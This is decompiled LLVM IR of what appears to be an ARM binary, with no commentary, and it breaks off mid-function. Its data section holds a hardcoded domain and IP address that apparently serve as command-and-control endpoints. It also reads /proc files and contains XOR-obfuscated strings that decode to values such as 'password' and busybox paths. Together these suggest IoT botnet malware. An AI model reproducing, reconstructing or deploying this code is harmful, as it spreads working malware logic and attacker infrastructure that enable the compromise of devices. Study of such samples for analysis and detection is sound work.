source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_d968.14 = constant i32 -382906384
@global_var_1f250.19 = global i32 0
@global_var_82dc.20 = constant i32 -352321547
@global_var_12da0.21 = constant i32 -382909968
@global_var_a048.27 = constant i32 -382906384
@global_var_a480.29 = constant i32 -382906384
@global_var_896c.31 = constant i32 -382906384
@global_var_c19c.33 = constant i32 -382906384
@global_var_baa4.35 = constant i32 -382906384
@global_var_b2f0.37 = constant i32 -382906384
@global_var_9a2c.40 = constant i32 -382906384
@global_var_9398.42 = constant i32 -382906384
@global_var_212d8.45 = global i32 0
@global_var_1667c.57 = constant i32 47
@global_var_212e0.59 = global i32 0
@global_var_1f254.61 = global i32 0
@global_var_212dc.63 = global i32 0
@global_var_110d8.65 = constant i32 -382910336
@global_var_d4ac.66 = constant i32 -509607932
@global_var_d7f4.68 = constant i32 -382910352
@global_var_16680.74 = constant [22 x i8] c"indiatechsupport.club\00"
@global_var_212e8.77 = local_unnamed_addr global i32 0
@global_var_212e6.78 = local_unnamed_addr global i32 0
@global_var_16698.80 = constant [15 x i8] c"188.166.125.59\00"
@global_var_1f258.82 = global i32 0
@global_var_166a8.90 = constant i32 10
@global_var_1130c.96 = constant i32 -382910336
@global_var_166ac.99 = constant i32 16777216
@global_var_1f260.101 = global i32 0
@global_var_1f26c.103 = global i32 0
@global_var_1f264.105 = global i32 0
@global_var_1f268.107 = global i32 0
@global_var_e780.120 = constant i32 -509607925
@global_var_1f2a4.122 = global i32 0
@global_var_1f270.124 = global i32 0
@global_var_1f29c.126 = global i32 0
@global_var_212fc.130 = global i32 0
@global_var_212f4.134 = global i32 0
@global_var_212f8.136 = global i32 0
@global_var_1f276.139 = local_unnamed_addr global i32 0
@global_var_1f278.143 = local_unnamed_addr global i32 0
@global_var_1f27c.144 = local_unnamed_addr global i32 0
@global_var_1f27d.145 = local_unnamed_addr global i32 0
@global_var_1f296.148 = local_unnamed_addr global i32 0
@global_var_166b8.150 = constant i32 0
@global_var_166b4.152 = constant [5 x i8] c"&;; \00"
@global_var_166bc.154 = constant [5 x i8] c"5:?;\00"
@global_var_166c4.156 = constant [9 x i8] c"<!: acam\00"
@global_var_166d0.158 = constant [7 x i8] c" 18:1 \00"
@global_var_166d8.160 = constant [8 x i8] c"0125!8 \00"
@global_var_166e0.162 = constant [9 x i8] c"$5''#;&0\00"
@global_var_166ec.164 = constant [6 x i8] c"509=:\00"
@global_var_166f4.166 = constant [6 x i8] c"\22=.,\22\00"
@global_var_166fc.168 = constant [8 x i8] c"'!$$;& \00"
@global_var_16704.170 = constant i32 423502179
@global_var_16714.172 = constant [6 x i8] c"efg`a\00"
@global_var_1671c.174 = constant [5 x i8] c"!'1&\00"
@global_var_16724.176 = constant i32 943467547
@global_var_16730.178 = constant i32 322070023
@global_var_1f280.179 = local_unnamed_addr global i32 0
@global_var_1f27e.180 = local_unnamed_addr global i32 0
@global_var_1f284.181 = local_unnamed_addr global i32 0
@global_var_1f28c.183 = local_unnamed_addr global i32 0
@global_var_1f298.184 = local_unnamed_addr global i32 0
@global_var_e868.186 = constant i32 -382910352
@global_var_1673c.190 = constant [3 x i8] c"\0D\0A\00"
@global_var_16748.192 = constant i32 2096127
@global_var_1673f.194 = constant i32 2095871
@global_var_21304.199 = global i32 0
@global_var_1674c.206 = constant [3 x i8] c"Qm\00"
@global_var_2130c.207 = local_unnamed_addr global i32 0
@global_var_21310.208 = local_unnamed_addr global i32 0
@global_var_16750.210 = constant i32 59987
@global_var_21314.211 = local_unnamed_addr global i32 0
@global_var_21318.212 = local_unnamed_addr global i32 0
@global_var_168b8.214 = constant i32 808465680
@global_var_21320.215 = local_unnamed_addr global i32 0
@global_var_2131c.216 = local_unnamed_addr global i32 0
@global_var_16754.218 = constant [7 x i8] c"'<188T\00"
@global_var_21324.219 = local_unnamed_addr global i32 0
@global_var_21328.220 = local_unnamed_addr global i32 0
@global_var_1675c.222 = constant [8 x i8] c"1:5681T\00"
@global_var_2132c.223 = local_unnamed_addr global i32 0
@global_var_21330.224 = local_unnamed_addr global i32 0
@global_var_16764.226 = constant [8 x i8] c"'-' 19T\00"
@global_var_21334.227 = local_unnamed_addr global i32 0
@global_var_21338.228 = local_unnamed_addr global i32 0
@global_var_1676c.230 = constant [4 x i8] c"'<T\00"
@global_var_21340.231 = local_unnamed_addr global i32 0
@global_var_2133c.232 = local_unnamed_addr global i32 0
@global_var_16770.234 = constant i32 977090171
@global_var_21348.235 = local_unnamed_addr global i32 0
@global_var_21344.236 = local_unnamed_addr global i32 0
@global_var_16784.238 = constant i32 470227742
@global_var_21350.239 = local_unnamed_addr global i32 0
@global_var_2134c.240 = local_unnamed_addr global i32 0
@global_var_167a0.242 = constant [10 x i8] c":7;&&17 T\00"
@global_var_21358.243 = local_unnamed_addr global i32 0
@global_var_21354.244 = local_unnamed_addr global i32 0
@global_var_167ac.246 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_2135c.247 = local_unnamed_addr global i32 0
@global_var_21360.248 = local_unnamed_addr global i32 0
@global_var_167c0.250 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_21368.251 = local_unnamed_addr global i32 0
@global_var_21364.252 = local_unnamed_addr global i32 0
@global_var_167d8.254 = constant [8 x i8] c"{$&;7{T\00"
@global_var_2136c.255 = local_unnamed_addr global i32 0
@global_var_21370.256 = local_unnamed_addr global i32 0
@global_var_167e0.258 = constant [6 x i8] c"{1,1T\00"
@global_var_21374.259 = local_unnamed_addr global i32 0
@global_var_21378.260 = local_unnamed_addr global i32 0
@global_var_167e8.262 = constant [5 x i8] c"{20T\00"
@global_var_21380.263 = local_unnamed_addr global i32 0
@global_var_2137c.264 = local_unnamed_addr global i32 0
@global_var_167f0.266 = constant [7 x i8] c"{95$'T\00"
@global_var_21384.267 = local_unnamed_addr global i32 0
@global_var_21388.268 = local_unnamed_addr global i32 0
@global_var_167f8.270 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_2138c.271 = local_unnamed_addr global i32 0
@global_var_21390.272 = local_unnamed_addr global i32 0
@global_var_16808.274 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_213ec.275 = local_unnamed_addr global i32 0
@global_var_213f0.276 = local_unnamed_addr global i32 0
@global_var_16814.278 = constant [8 x i8] c"z5:=91T\00"
@global_var_213f4.279 = local_unnamed_addr global i32 0
@global_var_213f8.280 = local_unnamed_addr global i32 0
@global_var_1681c.282 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_21394.283 = local_unnamed_addr global i32 0
@global_var_21398.284 = local_unnamed_addr global i32 0
@global_var_16830.286 = constant [9 x i8] c"5''#;&0T\00"
@global_var_2139c.287 = local_unnamed_addr global i32 0
@global_var_213a0.288 = local_unnamed_addr global i32 0
@global_var_168d8.290 = constant i32 557516544
@global_var_213a8.291 = local_unnamed_addr global i32 0
@global_var_213a4.292 = local_unnamed_addr global i32 0
@global_var_1683c.294 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_213b0.295 = local_unnamed_addr global i32 0
@global_var_213ac.296 = local_unnamed_addr global i32 0
@global_var_16850.298 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_213b8.299 = local_unnamed_addr global i32 0
@global_var_213b4.300 = local_unnamed_addr global i32 0
@global_var_16860.302 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_213bc.303 = local_unnamed_addr global i32 0
@global_var_213c0.304 = local_unnamed_addr global i32 0
@global_var_16870.306 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_213c8.307 = local_unnamed_addr global i32 0
@global_var_213c4.308 = local_unnamed_addr global i32 0
@global_var_16884.310 = constant [9 x i8] c"$662*7!E\00"
@global_var_213cc.311 = local_unnamed_addr global i32 0
@global_var_213d0.312 = local_unnamed_addr global i32 0
@global_var_16890.314 = constant [6 x i8] c";3=:T\00"
@global_var_213d4.315 = local_unnamed_addr global i32 0
@global_var_213d8.316 = local_unnamed_addr global i32 0
@global_var_16898.318 = constant [7 x i8] c"1: 1&T\00"
@global_var_213dc.319 = local_unnamed_addr global i32 0
@global_var_213e0.320 = local_unnamed_addr global i32 0
@global_var_168a0.322 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_213e4.323 = local_unnamed_addr global i32 0
@global_var_213e8.324 = local_unnamed_addr global i32 0
@global_var_113d0.330 = constant i32 -443088884
@global_var_1f2c4.347 = global i32 0
@global_var_1180c.349 = constant i32 -456978431
@global_var_213fc.361 = global i32 0
@global_var_11d90.367 = constant i32 -478871519
@global_var_12810.381 = constant i32 -478805983
@global_var_12bec.390 = constant i32 -382906384
@global_var_1f2a8.398 = local_unnamed_addr global i32 0
@global_var_14674.400 = constant i32 -509591552
@global_var_1f2ac.409 = local_unnamed_addr global i32 0
@global_var_150a8.412 = constant i32 -382909968
@global_var_1344c.413 = constant i32 -494075872
@global_var_112d4.414 = constant i32 -382910336
@global_var_16908.418 = constant [11 x i8] c"/proc/stat\00"
@global_var_16914.421 = constant i32 32
@global_var_16918.424 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_16928.426 = constant [10 x i8] c"processor\00"
@global_var_1694c.428 = constant i32 604672
@global_var_1360c.431 = constant i32 -369098421
@global_var_1f2bc.444 = local_unnamed_addr global i32 0
@global_var_1f2c0.446 = local_unnamed_addr global i32 0
@global_var_16950.449 = constant [10 x i8] c"/dev/null\00"
@global_var_1301c.450 = constant i32 -442543860
@global_var_1500c.455 = constant i32 -382910352
@global_var_11840.460 = constant i32 -369094630
@global_var_13fd8.473 = constant i32 -335545128
@global_var_144a0.479 = constant i32 -382909456
@global_var_212d4.482 = local_unnamed_addr global i32 0
@global_var_16930.490 = constant i32 114
@global_var_154cc.495 = constant i32 -382906384
@global_var_20003.504 = global i32 0
@global_var_20000.505 = global i32 0
@global_var_14fac.515 = constant i32 -509607926
@global_var_16c5c.520 = constant i32 0
@global_var_16468.521 = constant i32 -382909968
@global_var_152f0.531 = constant i32 -509607928
@global_var_1f230.2 = external global i8*
@global_var_1f24c.17 = external global i8*
@global_var_1f24d.25 = global i8 0
@1 = internal constant [4 x i8] c"\90\F0\01\00"
@global_var_212e4.76 = global i16* null
@global_var_1f25c.94 = external global i8*
@global_var_1f2a0.128 = global i16* null
@global_var_1f274.138 = external global i8*
@global_var_1f288.141 = global i16 0
@global_var_1f294.142 = local_unnamed_addr global i8 0
@global_var_1f28a.146 = local_unnamed_addr global i16 0
@global_var_1f295.147 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_8098)
  %v31_80a0 = load i32, i32* @r0, align 4
  ret i32 %v31_80a0
}

define i32 @function_80b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_1f230.2 to i32), i32* %r4.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1f230.2 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %dec_label_pc_80c4, label %dec_label_pc_80e0

dec_label_pc_80c4:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80d4 = call i32 @function_80ec()
  store i32 %v3_80d4, i32* @r0, align 4
  %v2_80dc = load i32, i32* %r4.global-to-local, align 4
  %v3_80dc = inttoptr i32 %v2_80dc to i8*
  store i8 1, i8* %v3_80dc, align 1
  %v2_80e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80e0

dec_label_pc_80e0:                                ; preds = %entry, %dec_label_pc_80c4
  %v2_80e0 = phi i32 [ %v3_80b0, %entry ], [ %v2_80e0.pre, %dec_label_pc_80c4 ]
  store i32 %v2_80e0, i32* %r4.global-to-local, align 4
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4

; uselistorder directives
  uselistorder i8** @global_var_1f230.2, { 1, 0 }
  uselistorder label %dec_label_pc_80e0, { 1, 0 }
}

define i32 @function_80ec() local_unnamed_addr {
dec_label_pc_80ec:
  %v0_80f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80f0, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_80ec
  %v1_80f0 = load i32, i32* @r1, align 4
  %v2_80f0 = load i32, i32* @r0, align 4
  %v3_80f0 = and i32 %v2_80f0, %v1_80f0
  call void @__pseudo_branch(i32 %v3_80f0)
  br label %bb3

bb3:                                              ; preds = %bb, %dec_label_pc_80ec
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8118 = load i32, i32* inttoptr (i32 126988 to i32*), align 4
  %v2_811c = icmp eq i32 %v2_8118, 0
  br i1 %v2_811c, label %dec_label_pc_8134, label %dec_label_pc_8124

dec_label_pc_8124:                                ; preds = %bb3
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8134

dec_label_pc_8134:                                ; preds = %bb3, %dec_label_pc_8124
  ret i32 126988

; uselistorder directives
  uselistorder label %dec_label_pc_8134, { 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_815c = ptrtoint i32* %stack_var_4 to i32
  %v8_817c = call i32 @function_13d48(i32 ptrtoint (i32* @global_var_d968.14 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 91756, i32 %arg1, i32 %v4_815c)
  %v0_8180 = call i32 @function_1301c()
  ret i32 %v0_8180
}

define i32 @function_8190(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8190:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8190 = icmp eq i32 %arg1, 0
  br i1 %v2_8190, label %dec_label_pc_81d8, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %dec_label_pc_8190
  %v0_81a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81a0 = add i32 %v0_81a0, 4
  %v2_81a0 = inttoptr i32 %v1_81a0 to i8*
  %v3_81a0 = load i8, i8* %v2_81a0, align 1
  %v4_81a0 = zext i8 %v3_81a0 to i32
  %v9_81a4 = icmp eq i32 %v4_81a0, %arg3
  br i1 %v9_81a4, label %dec_label_pc_81e4, label %dec_label_pc_81c8.preheader

dec_label_pc_81c8.preheader:                      ; preds = %dec_label_pc_81a0
  br label %dec_label_pc_81c8

dec_label_pc_81b8:                                ; preds = %dec_label_pc_81c8
  %v1_81b8 = add i32 %v0_81c0.in, 12
  %v2_81b8 = inttoptr i32 %v1_81b8 to i8*
  %v3_81b8 = load i8, i8* %v2_81b8, align 1
  %v4_81b8 = zext i8 %v3_81b8 to i32
  %v9_81bc = icmp eq i32 %v4_81b8, %arg3
  br i1 %v9_81bc, label %dec_label_pc_81e4, label %dec_label_pc_81c8

dec_label_pc_81c8:                                ; preds = %dec_label_pc_81c8.preheader, %dec_label_pc_81b8
  %v0_81c0.in = phi i32 [ %v0_81a0, %dec_label_pc_81c8.preheader ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v0_81c8 = phi i32 [ 0, %dec_label_pc_81c8.preheader ], [ %v1_81c8, %dec_label_pc_81b8 ]
  %v0_81c0 = add i32 %v0_81c0.in, 8
  %v1_81c8 = add i32 %v0_81c8, 1
  %v9_81cc = icmp eq i32 %v1_81c8, %arg1
  store i32 %v0_81c0, i32* %r1.global-to-local, align 4
  br i1 %v9_81cc, label %dec_label_pc_81d8, label %dec_label_pc_81b8

dec_label_pc_81d8:                                ; preds = %dec_label_pc_81c8, %dec_label_pc_8190, %dec_label_pc_81e4
  %v0_81d8 = phi i32 [ %arg4, %dec_label_pc_8190 ], [ %v2_81e4, %dec_label_pc_81e4 ], [ %arg4, %dec_label_pc_81c8 ]
  ret i32 %v0_81d8

dec_label_pc_81e4:                                ; preds = %dec_label_pc_81b8, %dec_label_pc_81a0
  %v0_81e4 = phi i32 [ %v0_81a0, %dec_label_pc_81a0 ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v1_81e4 = inttoptr i32 %v0_81e4 to i32*
  %v2_81e4 = load i32, i32* %v1_81e4, align 4
  br label %dec_label_pc_81d8

; uselistorder directives
  uselistorder i32 %v1_81c8, { 1, 0 }
  uselistorder i32 %v0_81c0, { 1, 0, 2 }
  uselistorder i32 %v0_81c0.in, { 1, 0 }
  uselistorder i32 %v0_81a0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_81d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_81c8, { 1, 0 }
}

define i32 @function_81ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_81ec:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_81ec = load i32, i32* @r4, align 4
  store i32 %v3_81ec, i32* %stack_var_-32, align 4
  %v6_81ec = load i32, i32* @r5, align 4
  %v9_81ec = load i32, i32* @r6, align 4
  %v12_81ec = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_8204 = call i32 @function_10ffc()
  store i32 %v0_8204, i32* @r0, align 4
  %v7_8208 = icmp eq i32 %v0_8204, -1
  %tmp23 = icmp slt i32 %v0_8204, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_81ec
  br label %dec_label_pc_8228

bb24:                                             ; preds = %dec_label_pc_81ec
  %. = zext i1 %v7_8208 to i32
  store i32 %., i32* @r5, align 4
  %v2_8220 = icmp eq i1 %v7_8208, false
  br i1 %v2_8220, label %dec_label_pc_8230, label %dec_label_pc_8228

dec_label_pc_8228:                                ; preds = %.thread2, %bb24
  %v2_8228 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8228, i32* @r4, align 4
  store i32 %v6_81ec, i32* @r5, align 4
  store i32 %v9_81ec, i32* @r6, align 4
  store i32 %v12_81ec, i32* @r7, align 4
  ret i32 %v0_8204

dec_label_pc_8230:                                ; preds = %bb24
  %v0_8230 = call i32 @function_10ffc()
  %v7_8234 = icmp eq i32 %v0_8230, -1
  store i32 %v0_8230, i32* @r4, align 4
  br i1 %v7_8234, label %dec_label_pc_8264, label %dec_label_pc_8240

dec_label_pc_8240:                                ; preds = %dec_label_pc_8230
  %v2_8240 = icmp eq i32 %v0_8230, 0
  br i1 %v2_8240, label %dec_label_pc_8248, label %dec_label_pc_826c

dec_label_pc_8248:                                ; preds = %dec_label_pc_8240
  %v0_8248 = load i32, i32* @r6, align 4
  %v1_824c = call i32 @function_133f8(i32 %v0_8248)
  store i32 %v1_824c, i32* @r0, align 4
  %v0_8250 = call i32 @function_10ed0()
  %v2_8258 = call i32 @function_110d8(i32 %v0_8250, i32 9)
  %v0_825c = load i32, i32* @r4, align 4
  %v1_8260 = call i32 @function_13340(i32 %v0_825c)
  br label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8230, %dec_label_pc_8248
  %v0_8264 = load i32, i32* @r5, align 4
  %v1_8268 = call i32 @function_13340(i32 %v0_8264)
  br label %dec_label_pc_826c

dec_label_pc_826c:                                ; preds = %dec_label_pc_8240, %dec_label_pc_8264
  %v2_8270 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8270 = zext i8 %v2_8270 to i32
  %v2_8274 = icmp eq i8 %v2_8270, 0
  br i1 %v2_8274, label %dec_label_pc_82b8, label %dec_label_pc_827c

dec_label_pc_827c:                                ; preds = %dec_label_pc_826c
  %v2_8280 = load i32, i32* @global_var_1f250.19, align 4
  %v1_8284 = inttoptr i32 %v2_8280 to i32*
  %v2_8284 = load i32, i32* %v1_8284, align 4
  store i32 %v2_8284, i32* @ip, align 4
  %v1_8288 = add i32 %v2_8284, 4
  %v2_8288 = inttoptr i32 %v1_8288 to i8*
  %v3_8288 = load i8, i8* %v2_8288, align 1
  %v4_8288 = zext i8 %v3_8288 to i32
  %v1_828c = load i32, i32* @r7, align 4
  %v9_828c = icmp eq i32 %v4_8288, %v1_828c
  br i1 %v9_828c, label %dec_label_pc_82c0, label %dec_label_pc_82ac.preheader

dec_label_pc_82ac.preheader:                      ; preds = %dec_label_pc_827c
  %v1_8290 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ac

dec_label_pc_829c:                                ; preds = %dec_label_pc_82ac
  %v4_829c = mul i32 %v1_82ac, 4
  %v5_829c = add i32 %v4_829c, %v2_8280
  %v6_829c = inttoptr i32 %v5_829c to i32*
  %v7_829c = load i32, i32* %v6_829c, align 4
  store i32 %v7_829c, i32* @ip, align 4
  %v1_82a0 = add i32 %v7_829c, 4
  %v2_82a0 = inttoptr i32 %v1_82a0 to i8*
  %v3_82a0 = load i8, i8* %v2_82a0, align 1
  %v4_82a0 = zext i8 %v3_82a0 to i32
  %v9_82a4 = icmp eq i32 %v4_82a0, %v1_828c
  br i1 %v9_82a4, label %dec_label_pc_82c0, label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_82ac.preheader, %dec_label_pc_829c
  %v0_82ac = phi i32 [ %v1_8290, %dec_label_pc_82ac.preheader ], [ %v1_82ac, %dec_label_pc_829c ]
  %v1_82ac = add i32 %v0_82ac, 1
  %v9_82b0 = icmp eq i32 %v1_82ac, %v3_8270
  br i1 %v9_82b0, label %dec_label_pc_82b8, label %dec_label_pc_829c

dec_label_pc_82b8:                                ; preds = %dec_label_pc_82ac, %dec_label_pc_826c, %dec_label_pc_82c0
  %v1_82bc = call i32 @function_13340(i32 0)
  %v0_82d0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_82c0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_829c, %dec_label_pc_827c, %dec_label_pc_82b8
  %v0_82d0 = phi i32 [ %v2_8284, %dec_label_pc_827c ], [ %v0_82d0.pre, %dec_label_pc_82b8 ], [ %v7_829c, %dec_label_pc_829c ]
  %v1_82d0 = inttoptr i32 %v0_82d0 to i32*
  %v2_82d0 = load i32, i32* %v1_82d0, align 4
  store i32 %v2_82d0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_82d0)
  br label %dec_label_pc_82b8

; uselistorder directives
  uselistorder i32 %v1_82ac, { 2, 0, 1 }
  uselistorder i32 %v0_8230, { 1, 2, 0 }
  uselistorder i1 %v7_8208, { 1, 0 }
  uselistorder i32 %v0_8204, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_82c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_826c, { 1, 0 }
  uselistorder label %dec_label_pc_8264, { 1, 0 }
  uselistorder label %dec_label_pc_8228, { 1, 0 }
}

define i32 @function_82e8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_82e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_82e8 = load i32, i32* @r5, align 4
  %v9_82e8 = load i32, i32* @r6, align 4
  %v12_82e8 = load i32, i32* @r7, align 4
  %v18_82e8 = load i32, i32* @sb, align 4
  %v21_82e8 = load i32, i32* @sl, align 4
  %v24_82e8 = load i32, i32* @fp, align 4
  %v2_82ec = icmp ugt i32 %arg2, 2
  %v7_82ec = icmp eq i32 %arg2, 3
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_82f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_82f8, i32* @r5, align 4
  %v2_82fc = xor i1 %v7_82ec, true
  %v3_82fc = and i1 %v2_82ec, %v2_82fc
  br i1 %v3_82fc, label %dec_label_pc_830c, label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_834c, %.dec_label_pc_8300_crit_edge, %dec_label_pc_8340, %dec_label_pc_8330, %dec_label_pc_830c, %dec_label_pc_82e8, %dec_label_pc_84f8
  %v1_8308 = phi i32 [ %v1_8308.pre, %.dec_label_pc_8300_crit_edge ], [ %v1_8310, %dec_label_pc_834c ], [ %v1_8310, %dec_label_pc_8340 ], [ %v1_8310, %dec_label_pc_8330 ], [ %v1_8310, %dec_label_pc_830c ], [ %v0_82f8, %dec_label_pc_82e8 ], [ %v0_84fc, %dec_label_pc_84f8 ]
  store i32 %v6_82e8, i32* @r5, align 4
  store i32 %v9_82e8, i32* @r6, align 4
  store i32 %v12_82e8, i32* @r7, align 4
  store i32 %v18_82e8, i32* @sb, align 4
  store i32 %v21_82e8, i32* @sl, align 4
  store i32 %v24_82e8, i32* @fp, align 4
  ret i32 %v1_8308

dec_label_pc_830c:                                ; preds = %dec_label_pc_82e8
  %v1_830c = inttoptr i32 %v0_82f8 to i32*
  %v2_830c = load i32, i32* %v1_830c, align 4
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v1_8310 = and i32 %v2_830c, 16711680
  store i32 %v1_8310, i32* %r0.global-to-local, align 4
  %v3_8314 = udiv i32 %v2_830c, 16777216
  %v4_8318 = udiv i32 %v1_8310, 256
  %v5_8318 = or i32 %v4_8318, %v3_8314
  %v1_831c = and i32 %v2_830c, 65280
  store i32 %v1_831c, i32* %r2.global-to-local, align 4
  %v4_8320 = mul nuw nsw i32 %v1_831c, 256
  %v5_8320 = or i32 %v5_8318, %v4_8320
  store i32 %v5_8320, i32* %r3.global-to-local, align 4
  %v7_8324 = icmp eq i32 %arg2, 4
  store i1 %v7_8324, i1* %cpsr_z.global-to-local, align 1
  %v5_8328 = call i32 @llvm.bswap.i32(i32 %v2_830c)
  store i32 %v5_8328, i32* @fp, align 4
  br i1 %v7_8324, label %dec_label_pc_8300, label %dec_label_pc_8330

dec_label_pc_8330:                                ; preds = %dec_label_pc_830c
  %v1_8330 = add i32 %v0_82f8, 4
  %v2_8330 = inttoptr i32 %v1_8330 to i8*
  %v3_8330 = load i8, i8* %v2_8330, align 1
  %v4_8330 = zext i8 %v3_8330 to i32
  store i32 %v4_8330, i32* %r2.global-to-local, align 4
  %v7_8334 = icmp eq i32 %arg2, 5
  store i1 %v7_8334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8334, label %dec_label_pc_8300, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_8330
  %v1_8340 = add i32 %v0_82f8, 5
  %v2_8340 = inttoptr i32 %v1_8340 to i8*
  %v3_8340 = load i8, i8* %v2_8340, align 1
  %v4_8340 = zext i8 %v3_8340 to i32
  store i32 %v4_8340, i32* @sb, align 4
  %v2_8344 = icmp eq i8 %v3_8340, 0
  store i1 %v2_8344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8344, label %dec_label_pc_8300, label %dec_label_pc_834c

dec_label_pc_834c:                                ; preds = %dec_label_pc_8340
  %v2_8350 = mul nuw nsw i32 %v4_8340, 5
  store i32 %v2_8350, i32* @r7, align 4
  %v1_8354 = add i32 %arg2, -6
  store i32 %v1_8354, i32* %r3.global-to-local, align 4
  %v3_8358 = icmp ult i32 %v1_8354, %v2_8350
  %v9_8358 = icmp eq i32 %v1_8354, %v2_8350
  store i1 %v9_8358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8358, label %dec_label_pc_8300, label %dec_label_pc_8360

dec_label_pc_8360:                                ; preds = %dec_label_pc_834c
  store i32 %v4_8340, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8354, i32* @r6, align 4
  %v2_836c = call i32 @function_12654(i32 %v4_8340, i32 24)
  store i32 %v2_836c, i32* @ip, align 4
  %v0_8378 = load i32, i32* @r7, align 4
  %v1_8378 = load i32, i32* @r4, align 4
  %v2_8378 = sub i32 %v1_8378, %v0_8378
  store i32 %v2_8378, i32* @r7, align 4
  %v0_837c = load i32, i32* @r5, align 4
  %v1_837c = add i32 %v0_837c, 11
  store i32 %v1_837c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8380

